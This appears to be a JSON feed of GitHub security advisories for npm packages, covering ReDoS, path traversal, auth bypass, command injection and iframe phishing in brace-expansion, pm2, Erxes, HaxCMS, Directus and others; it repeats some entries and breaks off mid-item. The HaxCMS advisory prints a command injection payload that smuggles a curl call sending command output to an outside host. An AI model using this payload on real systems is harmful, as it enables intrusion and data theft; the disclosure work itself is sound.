{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5889\">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>\n<li><a href=\"https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311660\">https://vuldb.com/?ctiid.311660</a></li>\n<li><a href=\"https://vuldb.com/?id.311660\">https://vuldb.com/?id.311660</a></li>\n<li><a href=\"https://vuldb.com/?submit.585717\">https://vuldb.com/?submit.585717</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v6h2-p8h4-qcjw\">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
            "title": "[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-11T21:00:29.000Z",
            "date_published": "2025-06-09T21:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5889\">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>\n<li><a href=\"https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311660\">https://vuldb.com/?ctiid.311660</a></li>\n<li><a href=\"https://vuldb.com/?id.311660\">https://vuldb.com/?id.311660</a></li>\n<li><a href=\"https://vuldb.com/?submit.585717\">https://vuldb.com/?submit.585717</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v6h2-p8h4-qcjw\">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
            "title": "[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-11T21:00:29.000Z",
            "date_published": "2025-06-09T21:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5889\">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>\n<li><a href=\"https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311660\">https://vuldb.com/?ctiid.311660</a></li>\n<li><a href=\"https://vuldb.com/?id.311660\">https://vuldb.com/?id.311660</a></li>\n<li><a href=\"https://vuldb.com/?submit.585717\">https://vuldb.com/?submit.585717</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v6h2-p8h4-qcjw\">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
            "title": "[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-11T21:00:29.000Z",
            "date_published": "2025-06-09T21:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5889\">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>\n<li><a href=\"https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311660\">https://vuldb.com/?ctiid.311660</a></li>\n<li><a href=\"https://vuldb.com/?id.311660\">https://vuldb.com/?id.311660</a></li>\n<li><a href=\"https://vuldb.com/?submit.585717\">https://vuldb.com/?submit.585717</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>\n<li><a href=\"https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v6h2-p8h4-qcjw\">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
            "title": "[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-11T21:00:29.000Z",
            "date_published": "2025-06-09T21:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability classified as problematic was found in Unitech pm2 up to 6.0.6. This vulnerability affects unknown code of the file /lib/tools/Config.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5891\">https://nvd.nist.gov/vuln/detail/CVE-2025-5891</a></li>\n<li><a href=\"https://github.com/Unitech/pm2/pull/5971\">https://github.com/Unitech/pm2/pull/5971</a></li>\n<li><a href=\"https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385\">https://gist.github.com/mmmsssttt404/407e2ffe3e0eaa393ad923a86316a385</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311662\">https://vuldb.com/?ctiid.311662</a></li>\n<li><a href=\"https://vuldb.com/?id.311662\">https://vuldb.com/?id.311662</a></li>\n<li><a href=\"https://vuldb.com/?submit.585750\">https://vuldb.com/?submit.585750</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x5gf-qvw8-r2rm\">https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x5gf-qvw8-r2rm",
            "title": "[pm2] pm2 Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-10T22:52:18.000Z",
            "date_published": "2025-06-09T21:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x5gf-qvw8-r2rm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Erxes &lt;1.6.2, an unauthenticated attacker can read arbitrary files from the system using a Path Traversal vulnerability in the /read-file endpoint handler.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57186\">https://nvd.nist.gov/vuln/detail/CVE-2024-57186</a></li>\n<li><a href=\"https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3\">https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3</a></li>\n<li><a href=\"https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices\">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rq9r-qvwg-829q\">https://github.com/advisories/GHSA-rq9r-qvwg-829q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rq9r-qvwg-829q",
            "title": "[erxes] Erxes Path Traversal vulnerability",
            "date_modified": "2025-06-10T20:27:02.000Z",
            "date_published": "2025-06-10T18:32:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rq9r-qvwg-829q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Erxes &lt;1.6.1 is vulnerable to Incorrect Access Control. An attacker can bypass authentication by providing a \"User\" HTTP header that contains any user, allowing them to talk to any GraphQL endpoint.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57190\">https://nvd.nist.gov/vuln/detail/CVE-2024-57190</a></li>\n<li><a href=\"https://github.com/erxes/erxes/commit/4ed2ca797241d2ba0c9083feeadd9755c1310ce8\">https://github.com/erxes/erxes/commit/4ed2ca797241d2ba0c9083feeadd9755c1310ce8</a></li>\n<li><a href=\"https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices\">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7rhv-xm4q-wh42\">https://github.com/advisories/GHSA-7rhv-xm4q-wh42</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7rhv-xm4q-wh42",
            "title": "[erxes] Erxes Incorrect Access Control vulnerability",
            "date_modified": "2025-06-10T20:26:41.000Z",
            "date_published": "2025-06-10T18:32:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7rhv-xm4q-wh42"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Erxes &lt;1.6.2, an authenticated attacker can write to arbitrary files on the system using a Path Traversal vulnerability in the importHistoriesCreate GraphQL mutation handler.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57189\">https://nvd.nist.gov/vuln/detail/CVE-2024-57189</a></li>\n<li><a href=\"https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3\">https://github.com/erxes/erxes/commit/d626070a0fcd435ae29e689aca051ccfb440c2f3</a></li>\n<li><a href=\"https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices\">https://www.sonarsource.com/blog/micro-services-major-headaches-detecting-vulnerabilities-in-erxes-microservices</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2977-5php-6789\">https://github.com/advisories/GHSA-2977-5php-6789</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2977-5php-6789",
            "title": "[erxes] Erxes Path Traversal vulnerability",
            "date_modified": "2025-06-10T20:25:50.000Z",
            "date_published": "2025-06-10T18:32:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2977-5php-6789"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in vuejs vue-cli up to 5.0.8. It has been rated as problematic. This issue affects the function HtmlPwaPlugin of the file packages/@vue/cli-plugin-pwa/lib/HtmlPwaPlugin.js of the component Markdown Code Handler. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5897\">https://nvd.nist.gov/vuln/detail/CVE-2025-5897</a></li>\n<li><a href=\"https://github.com/vuejs/vue-cli/pull/7478\">https://github.com/vuejs/vue-cli/pull/7478</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311669\">https://vuldb.com/?ctiid.311669</a></li>\n<li><a href=\"https://vuldb.com/?id.311669\">https://vuldb.com/?id.311669</a></li>\n<li><a href=\"https://vuldb.com/?submit.585798\">https://vuldb.com/?submit.585798</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-79vf-hf9f-j9q8\">https://github.com/advisories/GHSA-79vf-hf9f-j9q8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-79vf-hf9f-j9q8",
            "title": "[@vue/cli-plugin-pwa] @vue/cli-plugin-pwa Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-09T23:10:43.000Z",
            "date_published": "2025-06-09T21:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-79vf-hf9f-j9q8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in tarojs taro up to 4.1.1. It has been declared as problematic. This vulnerability affects unknown code of the file taro/packages/css-to-react-native/src/index.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 4.1.2 is able to address this issue. The name of the patch is c2e321a8b6fc873427c466c69f41ed0b5e8814bf. It is recommended to upgrade the affected component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5896\">https://nvd.nist.gov/vuln/detail/CVE-2025-5896</a></li>\n<li><a href=\"https://github.com/NervJS/taro/pull/17619\">https://github.com/NervJS/taro/pull/17619</a></li>\n<li><a href=\"https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf\">https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf</a></li>\n<li><a href=\"https://github.com/NervJS/taro/releases/tag/v4.1.2\">https://github.com/NervJS/taro/releases/tag/v4.1.2</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.311668\">https://vuldb.com/?ctiid.311668</a></li>\n<li><a href=\"https://vuldb.com/?id.311668\">https://vuldb.com/?id.311668</a></li>\n<li><a href=\"https://vuldb.com/?submit.585796\">https://vuldb.com/?submit.585796</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f5xg-cfpj-2mw6\">https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f5xg-cfpj-2mw6",
            "title": "[taro-css-to-react-native] taro-css-to-react-native Regular Expression Denial of Service vulnerability",
            "date_modified": "2025-06-09T23:08:48.000Z",
            "date_published": "2025-06-09T21:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f5xg-cfpj-2mw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The 'gitImportSite' functionality obtains a URL string from a POST request and insufficiently validates user input. The ’set_remote’ function later passes this input into ’proc_open’, yielding OS command injection.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability exists in the logic of the ’gitImportSite’ function, located in ’Operations.php’. The current implementation only relies on the ’filter_var’ and 'strpos' functions to validate the URL, which is not sufficient to ensure absence of all Bash special characters used for command injection.\n<img alt=\"gitImportSite\" src=\"https://github.com/user-attachments/assets/af9935ef-4735-446d-833f-2c2590ff1508\"></p>\n<h4 id=\"affected-resources\">Affected Resources</h4>\n<p>• Operations.php:2103 gitImportSite()\n• &lt;domain&gt;/&lt;user&gt;/system/api/gitImportSite</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To replicate this vulnerability, authenticate and send a POST request to the 'gitImportSite' endpoint with a crafted URL in the JSON data. Note, a valid token needs to be obtained by capturing a request to another API endpoint (such as 'archiveSite').</p>\n<ol>\n<li><p>Start a webserver.\n<img alt=\"webserver\" src=\"https://github.com/user-attachments/assets/8594f9b1-67fa-4352-bbc3-310bb164ec9b\"></p>\n</li>\n<li><p>Initiate a request to the ’archiveSite’ endpoint.\n<img alt=\"archiveSite\" src=\"https://github.com/user-attachments/assets/08503f36-d984-4d53-8fe6-577ad78d5eb7\"></p>\n</li>\n<li><p>Capture and modify the request in BurpSuite.\n<img alt=\"request-modification\" src=\"https://github.com/user-attachments/assets/61cd211e-afd3-453e-b86b-58bccffaf824\"></p>\n</li>\n<li><p>Observe command output in the HTTP request from the server.\n<img alt=\"command-output\" src=\"https://github.com/user-attachments/assets/35f32274-b709-41d5-adaa-bea48f5cf33c\"></p>\n</li>\n</ol>\n<h4 id=\"command-injection-payload\">Command Injection Payload</h4>\n<pre><code class=\"language-Bash\">http://&lt;IP&gt;/.git;curl${IFS}&lt;IP&gt;/$(whoami)/$(id)#=abcdef\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>An authenticated attacker can craft a URL string that bypasses the validation checks employed by the ’filter_var’ and ’strpos’ functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw\">https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw</a></li>\n<li><a href=\"https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3\">https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-49141\">https://nvd.nist.gov/vuln/detail/CVE-2025-49141</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4cf-pp4x-hqgw\">https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4cf-pp4x-hqgw",
            "title": "[@haxtheweb/haxcms-nodejs] HaxCMS-PHP Command Injection Vulnerability",
            "date_modified": "2025-06-09T21:44:12.000Z",
            "date_published": "2025-06-09T20:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4cf-pp4x-hqgw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In the HAX site editor, users can create a website block to load another site in an iframe. The application allows users to supply a target URL in the website block. When the HAX site is visited, the client's browser will query the supplied URL.</p>\n<h3 id=\"affected-resources\">Affected Resources</h3>\n<ul>\n<li><a href=\"https://github.com/haxtheweb/haxcms-php/blob/master/system/backend/php/lib/Operations.php#L868\">Operations.php:868</a></li>\n<li><code>https://&lt;site&gt;/&lt;user&gt;/system/api/saveNode</code></li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Set the URL in an iframe pointing to an attacker-controlled server running Responder</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/baac23ec-7b1e-49cf-864d-c3550b2c71bf\"></p>\n<ol start=\"2\">\n<li>Once another user visits the site, they are prompted to sign in.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/a3a0b75d-e12f-49cf-8669-9686353a92e2\"></p>\n<ol start=\"3\">\n<li>If a user inputs credentials, the username and password hash are outputted in Responder.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/428542d3-8cf5-4bfa-b759-e630c3ee6ac3\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>An authenticated attacker can create a HAX site with a website block pointing at an attacker-controlled server running Responder or a similar tool. The attacker can then conduct a phishing attack by convincing another user to visit their malicious HAX site to harvest credentials.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88\">https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88</a></li>\n<li><a href=\"https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5\">https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-49139\">https://nvd.nist.gov/vuln/detail/CVE-2025-49139</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3ph-2q5q-cg88\">https://github.com/advisories/GHSA-v3ph-2q5q-cg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v3ph-2q5q-cg88",
            "title": "[@haxtheweb/haxcms-nodejs] @haxtheweb/haxcms-nodejs Iframe Phishing vulnerability",
            "date_modified": "2025-06-09T21:44:09.000Z",
            "date_published": "2025-06-09T19:07:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v3ph-2q5q-cg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>\n<h3 id=\"details\">Details</h3>\n<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create an active user</li>\n<li>Log in with that user and note the session cookie</li>\n<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>\n<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This weakens the security of suspending users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771\">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30351\">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g",
            "title": "[@directus/types] Suspended Directus user can continue to use session token to access API",
            "date_modified": "2025-06-09T18:12:10.000Z",
            "date_published": "2025-03-26T18:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>\n<h3 id=\"details\">Details</h3>\n<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create an active user</li>\n<li>Log in with that user and note the session cookie</li>\n<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>\n<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This weakens the security of suspending users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 